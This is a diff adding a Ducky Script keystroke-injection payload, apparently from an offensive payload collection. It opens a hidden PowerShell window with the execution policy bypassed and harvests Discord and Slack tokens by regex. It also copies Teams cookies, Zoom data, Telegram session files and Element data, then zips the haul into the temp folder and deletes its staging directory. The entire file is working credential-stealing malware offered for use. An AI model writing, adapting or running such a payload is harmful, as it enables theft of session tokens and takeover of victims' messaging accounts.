@@ -1,0 +1,72 @@
+REM =============================================
+REM Title: Slack & Discord Token Grabber
+REM Author: bad-antics
+REM Description: Extract tokens from collaboration apps
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\tokenloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Discord tokens from multiple locations
+STRING $discordPaths=@("$env:APPDATA\discord\Local Storage\leveldb","$env:APPDATA\discordcanary\Local Storage\leveldb","$env:APPDATA\discordptb\Local Storage\leveldb")
+ENTER
+DELAY 200
+
+STRING foreach($path in $discordPaths){if(Test-Path $path){Get-ChildItem $path -Filter "*.ldb"|%{$c=Get-Content $_.FullName -Raw 2>$null;if($c-match'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'){$matches[0]|Add-Content "$d\discord_tokens.txt"}}}}
+ENTER
+DELAY 500
+
+REM Slack tokens
+STRING $slackPath="$env:APPDATA\Slack\storage"
+ENTER
+DELAY 100
+
+STRING if(Test-Path $slackPath){Get-ChildItem $slackPath -Filter "*.json" -Recurse|%{$c=Get-Content $_.FullName -Raw 2>$null;if($c-match'xox[baprs]-[\w-]+'){$matches[0]|Add-Content "$d\slack_tokens.txt"}}}
+ENTER
+DELAY 400
+
+REM Teams tokens
+STRING $teamsPath="$env:APPDATA\Microsoft\Teams"
+ENTER
+DELAY 100
+
+STRING if(Test-Path $teamsPath){cp "$teamsPath\storage.json" "$d\teams_storage.json" 2>$null;cp "$teamsPath\Cookies" "$d\teams_cookies" 2>$null}
+ENTER
+DELAY 300
+
+REM Zoom credentials
+STRING if(Test-Path "$env:APPDATA\Zoom"){cp -r "$env:APPDATA\Zoom\data" "$d\zoom" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM Telegram Desktop
+STRING if(Test-Path "$env:APPDATA\Telegram Desktop\tdata"){cp -r "$env:APPDATA\Telegram Desktop\tdata\D877F783D5D3EF8C*" "$d\telegram\" -Force 2>$null}
+ENTER
+DELAY 300
+
+REM Element/Matrix tokens
+STRING if(Test-Path "$env:APPDATA\Element"){Get-ChildItem "$env:APPDATA\Element" -Filter "*.json" -Recurse|%{cp $_.FullName "$d\element_$($_.Name)" 2>$null}}
+ENTER
+DELAY 200
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\tokens_$(hostname).zip" -Force
+ENTER
+DELAY 400
+
+STRING Remove-Item $d -Recurse -Force
+ENTER
+
+STRING exit
+ENTER
